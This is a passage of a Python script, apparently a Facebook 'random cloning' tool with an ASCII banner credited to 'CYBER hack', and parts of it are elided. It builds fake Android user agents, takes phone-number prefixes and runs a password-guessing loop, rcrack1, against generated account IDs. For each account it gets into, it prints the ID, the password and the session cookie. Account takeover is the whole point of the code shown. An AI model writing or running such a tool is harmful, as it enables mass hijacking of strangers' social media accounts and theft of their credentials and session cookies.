...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/Ayan-420')

logo = ("""
    sSSs   .S_SSSs     .S_sSSs     .S_sSSs     .S    sSSs  
 d%%SP  .SS~SSSSS   .SS~YS%%b   .SS~YS%%b   .SS   d%%SP  
d%S'    S%S   SSSS  S%S   `S%b  S%S   `S%b  S%S  d%S'    
S%S     S%S    S%S  S%S    S%S  S%S    S%S  S%S  S%|     
S&S     S%S SSSS%S  S%S    d*S  S%S    S&S  S&S  S&S     
S&S_Ss  S&S  SSS%S  S&S   .S*S  S&S    S&S  S&S  Y&Ss    
S&S~SP  S&S    S&S  S&S_sdSSS   S&S    S&S  S&S  `S&&S   
S&S     S&S    S&S  S&S~YSY%b   S&S    S&S  S&S    `S*S  
S*b     S*S    S&S  S*S   `S%b  S*S    d*S  S*S     l*S  
...
\033[1;94m       [+]        TEAM         :   CYBER hack      \033[1;94m[+]
\033[1;94m       [+]        TOOL VERSION :  0.1                    \033[1;94m[+]
\033[1;94m       [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;94m[+]
\033[1;94m       [+]        COUNTRY      :  Afghanistan            \033[1;94m[+]
\033[1;94m       [+]===============================================[+]
""")                                              
...
class Main:
    def __init__(self):
        ...
        print(" [00] Exit")        
        Alif =input(" [?] Choose : ")
        os.system('xdg-open https://facebook.com/sabawonnoorzi/')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('clear')
...
def num():
    ...
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 070, 077, 078, 074, 079,  ')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mFardis\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Fardis-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Fardis-CP🔪] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Fardis🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
